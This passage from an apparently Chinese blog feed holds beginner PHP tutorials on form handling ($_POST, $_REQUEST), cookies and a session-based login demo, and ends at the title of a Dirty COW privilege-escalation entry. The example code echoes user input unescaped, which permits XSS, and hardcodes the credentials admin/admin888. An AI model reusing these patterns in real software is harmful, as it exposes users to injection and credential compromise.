data-original="https://img-blog.csdnimg.cn/20201102144746824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102144758858.png#pic_center" alt="在这里插入图片描述"></p><h5 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h5><p>post方式也跟上面方式一样，通过表单提交，所以先写一个提交页面：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试<span class="token constant">POST</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hello.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    Username<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    Pssword<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>注册<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在写一个接收参数的页面：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 定义一个计算和的函数</span><span class="token comment" spellcheck="true">// function PostAdd($a,$b)</span><span class="token comment" spellcheck="true">// {</span><span class="token comment" spellcheck="true">//     return $a+$b;</span><span class="token comment" spellcheck="true">// }</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"No Post number!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"注册成功！&lt;br>Your username is: $username&lt;br>Your password is: $password"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102150144191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102150200819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h5><p>这个超全局变量其实就是$_GET + $_POST，做一个实验看看就知道了：</p><p>它既支持POST：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102153120394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>也支持GET：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102153655911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的会话技术</title>
      <link href="/posts/353d84.html"/>
      <url>/posts/353d84.html</url>
      
        <content type="html"><![CDATA[<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>设置Cookie用setcookie函数格式如下：</p><pre><code>setcookie('name','value');</code></pre><p>例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.aaa.com'</span><span class="token punctuation">,</span><span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.bbb.com'</span><span class="token punctuation">,</span><span class="token string">'zxcasd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.ccc.com'</span><span class="token punctuation">,</span><span class="token string">'1fewq'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.ddd.com'</span><span class="token punctuation">,</span><span class="token string">'sadb23v'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.eee.com'</span><span class="token punctuation">,</span><span class="token string">'sadvb221'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="设置超时时间"><a href="#设置超时时间" class="headerlink" title="设置超时时间"></a>设置超时时间</h5><p>超时时间用time参数即可：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.aaa.com'</span><span class="token punctuation">,</span><span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.bbb.com'</span><span class="token punctuation">,</span><span class="token string">'zxcasd'</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.ccc.com'</span><span class="token punctuation">,</span><span class="token string">'1fewq'</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.ddd.com'</span><span class="token punctuation">,</span><span class="token string">'sadb23v'</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'www.eee.com'</span><span class="token punctuation">,</span><span class="token string">'sadvb221'</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里借助插件看一下就知道，这个Cookie过期了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102193224341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="用Cookie写一个网站访问计数器"><a href="#用Cookie写一个网站访问计数器" class="headerlink" title="用Cookie写一个网站访问计数器"></a>用Cookie写一个网站访问计数器</h5><p>在写之前需要说明一下，这个Cookie设置完以后，直接取是取不出来的，只有第二次访问页面时，才会带着cookie访问，所以我们这么写：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token shell-comment comment"># 初始化变量num</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 如果cookie的值为空</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'access'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 设置cookie的值为1</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'access'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 因为第一次访问不带cookie，所以这里做一个优化，让它输出1，假装用户带着cookie访问的</span>        <span class="token keyword">echo</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 如果已经有了cookie</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># 那么num的值就等于当前的cookie值</span>        <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'access'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># num的值进行自加</span>        <span class="token variable">$num</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 重新设置cookie</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'access'</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$num</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>cookie是保存在浏览器端的，而session是保存在服务器端的，但是session必须依靠cookie来实现，在使用session之前，必须使用一个函数session_start()：</p><p>先写一个传递session的页面：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'website'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这边var_dump一下这个session：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102231641638.png#pic_center" alt="在这里插入图片描述"></p><h5 id="清空Session"><a href="#清空Session" class="headerlink" title="清空Session"></a>清空Session</h5><p>直接把Session赋值给一个空数组就行了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 清空Session</span><span class="token variable">$_SESSION</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 或者</span><span class="token comment" spellcheck="true">// session_destroy()</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102232555562.png#pic_center" alt="在这里插入图片描述"></p><h5 id="Session登陆测试"><a href="#Session登陆测试" class="headerlink" title="Session登陆测试"></a>Session登陆测试</h5><p>首先写一个登录界面进行表单提交：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>后台管理<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t3.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    用户名<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    密码<span class="token punctuation">:</span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103004826789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>接着写一个验证环节：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 开启一个会话</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 如果post的数据为空</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 输出无法登录并给出跳转登录链接</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('内容不能为空！')&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='t2.php'>请登录&lt;/a>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 若post数据不为空则把username，password分别赋值给他们的变量</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 如果username和password符合条件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token string">'admin888'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 将username的值储存到session的name中</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 跳转到t1.php</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: t1.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># 不符合条件则给出跳转链接重新登录</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('用户名或密码错误！')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;a href='t2.php'>请登录&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103004852790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>最后符合条件来到欢迎登陆界面，这里做了一个session验证：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token shell-comment comment"># 开始一个会话</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 如果session的值为空</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>            <span class="token shell-comment comment"># 输出无权访问并给出跳转登录链接</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('无权访问！')&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='t2.php'>请登录&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># 若session值不为空则将session中name的值赋给变量name进行下一步的弹窗</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('欢迎 $name 登录系统！')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103004914968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>脏牛提权漏洞复现（CVE-2016-5159）</title>
      <link href="/posts/6b89328c.html"/>
